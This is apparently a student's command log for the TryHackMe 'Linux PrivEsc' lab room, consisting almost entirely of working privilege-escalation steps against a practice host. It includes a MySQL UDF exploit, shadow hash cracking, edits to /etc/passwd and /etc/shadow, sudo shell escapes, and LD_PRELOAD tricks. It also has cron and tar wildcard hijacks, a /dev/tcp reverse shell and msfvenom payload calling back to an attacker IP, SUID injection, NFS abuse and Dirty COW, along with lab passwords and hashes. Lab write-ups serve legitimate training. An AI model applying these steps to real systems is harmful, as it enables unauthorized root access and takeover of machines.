+++
title = "Linux PrivEsc"
+++
# https://tryhackme.com/room/linuxprivesc

```bash
=================================
10.201.16.178 -- domain.com -- win/lin x32/x64
=================================

echo 'export TARGET=10.201.16.178' >> ~/.zshrc

2025-08-29 16:15:28 -- sshpass -p 'password321' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -oHostKeyAlgorithms=+ssh-rsa user@$TARGET

2025-08-29 16:15:34 -- id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)

### SERVICE - mysql
# https://www.exploit-db.com/exploits/1518

# compile exploit of helper library
cd /home/user/tools/mysql-udf
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

# add mysql function (udf)
mysql -u root
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';

# copy shell with sticky bit set by executing command via mysql
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
exit

# execute sticky bit bash
/tmp/rootbash -p
whoami
// root

### READABLE /etc/shadow

user@debian:~$ ll /etc/shadow
-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow

root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::

john --wordlist=/usr/share/wordlists/rockyou.txt shadow_hashes.txt
password123      (root)
password321      (user)

### WRITABLE /etc/shadow

mkpasswd -m sha-512 'abc123!!!'
$6$3RThwnJXq$ah8pZvAFx6Ves8iAyRptkZ90JpzZraOBrartoTr.jH1aQdEcTYEowqLy59khKy8t/e3lQkrK/ucDgznwfylvh.

# original root:
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIH
sc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD
3B0fGxJI0:17298:0:99999:7:::

# new root:
root:$6$3RThwnJXq$ah8pZvAFx6Ves8iAyRptkZ90JpzZraOBrartoTr.jH1aQdEcTYEowqLy59khKy8t/e3lQkrK/ucDgznwfylvh.:17298:0:99999:7:::

su root
// abc123!!! works

### WRITABLE /etc/passwd

ll /etc/passwd
-rw-r--rw- 1 root root 1009 Aug 25  2019 /etc/passwd

mkpasswd -m sha-512 'potato'
$6$QoNl/7DQCmBZRYeC$KRQmLIWBT2UlyG8H10bwNAQ01QGuy6R9K0ETNScLRPWtjWQDOaiux.3rw/q69d1YwX0iMfz2ZFZt3vOZix1db1

echo 'newroot:$6$QoNl/7DQCmBZRYeC$KRQmLIWBT2UlyG8H10bwNAQ01QGuy6R9K0ETNScLRPWtjWQDOaiux.3rw/q69d1YwX0iMfz2ZFZt3vOZix1db1:0:0:root:/root:/bin/bash' >> /etc/passwd

2025-08-29 16:49:13 -- su newroot
// root!

### SHELL ESCAPE SEQUENCES

2025-08-29 16:56:52 -- sudo -l
Matching Defaults entries for user on this
    host:
    env_reset, env_keep+=LD_PRELOAD,
    env_keep+=LD_LIBRARY_PATH
// look for "sudo" on:
// https://gtfobins.github.io/
User user may run the following commands on
    this host:
    (root) NOPASSWD: /usr/sbin/iftop
sudo iftop
    (root) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit
    (root) NOPASSWD: /usr/bin/nano
export TERM=xterm-256color
sudo nano
^R^X
reset; sh 1>&0 2>&0
    (root) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/sh'
    (root) NOPASSWD: /usr/bin/man
sudo man man
!/bin/sh
    (root) NOPASSWD: /usr/bin/awk
sudo awk 'BEGIN {system("/bin/sh")}'
    (root) NOPASSWD: /usr/bin/less
sudo less /etc/profile
!/bin/sh
    (root) NOPASSWD: /usr/bin/ftp
sudo ftp
!/bin/sh
    (root) NOPASSWD: /usr/bin/nmap
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF
    (root) NOPASSWD: /usr/sbin/apache2
// did not work
    (root) NOPASSWD: /bin/more
TERM= sudo more /etc/profile
!/bin/sh

### ENV VARS

sudo -l
Matching Defaults entries for user on this
    host:
    env_reset, env_keep+=LD_PRELOAD,
    env_keep+=LD_LIBRARY_PATH

gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c

sudo LD_PRELOAD=/tmp/preload.so find
// root!

---

ldd /usr/sbin/apache2
// using 	libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f55600a7000)
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp apache2
// root!

### CRON FILE HIJACK

cat /etc/crontab
...
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
...

user@debian:~$ ll /usr/local/bin/compress.sh /usr/local/bin/overwrite.sh
-rwxr--r-- 1 root staff 53 May 13  2017 /usr/local/bin/compress.sh
-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh

nv -lvnp 4444
echo '#!/bin/bash
bash -i >& /dev/tcp/10.6.4.0/4444 0>&1' > /usr/local/bin/overwrite.sh
// wait... worked! and root!

### CRON PATH HIJACK

cat /etc/crontab
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# since overwrite.sh uses relpath
echo '#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash' > ~/overwrite.sh
chmod +x ~/overwrite.sh

/tmp/rootbash -p
// root!

### CRON WILCARDS
## more of tar * expansion hack

# /usr/local/bin/compress.sh
# #!/bin/sh
# cd /home/user
# tar czf /tmp/backup.tar.gz *

nc -vnlp 4444
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.6.4.0 LPORT=4444 -f elf -o shell.elf
chmod +x shell.elf
sshpass -p 'password321' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -oHostKeyAlgorithms=+ssh-rsa shell.elf user@$TARGET:/home/user/

touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf

### STICKY BITS SID/SGID EXES

find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
// lrwxrwxrwx 1 root root 11 May 13  2017 /usr/sbin/exim -> exim-4.84-3

# https://www.exploit-db.com/exploits/39535
pushd /tmp
wget -O exim.exploit https://www.exploit-db.com/raw/39535
chmod +x exim.exploit
sshpass -p 'password321' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -oHostKeyAlgorithms=+ssh-rsa exim.exploit user@$TARGET:/home/user/

./exim.exploit
PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps

### SUID/SGID SHARED OBJECT INJECTION

/usr/local/bin/suid-so
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
<grep -iE "open|access|no such file"
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
// ^ check out the lat line where it try to open a shared object in the user home dir

mkdir /home/user/.config
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
/usr/local/bin/suid-so
// root!

### SUID/SGID ENV

/usr/local/bin/suid-env

strings /usr/local/bin/suid-env
// service apache2 start

gcc -o service /home/user/tools/suid/service.c
// creats service exe file and were gonna path hijack
PATH=.:$PATH /usr/local/bin/suid-env
// root!

### ABUSING SHELLS 1

strings /usr/local/bin/suid-env2

function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
// old bash <4.2 hack

/usr/local/bin/suid-env2
// root!

### ABUSING SHELLS 2

env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
// old bash <4.4 hack

### HISTORY FILES

ls -l ~/.*history

### CONFIG FILES & SSH KEYS

// just looked at them

### NFS

cat /etc/exports
// /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)

# kali
mkdir /tmp/nfs
mount -o rw,vers=3 10.201.16.178:/tmp /tmp/nfs
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
chmod +xs /tmp/nfs/shell.elf

# target
/tmp/shell.elf
// root!

### KERNEL EXPLOITS

perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
// dirty cow

gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
./c0w
// wait a few mins

/usr/bin/passwd
```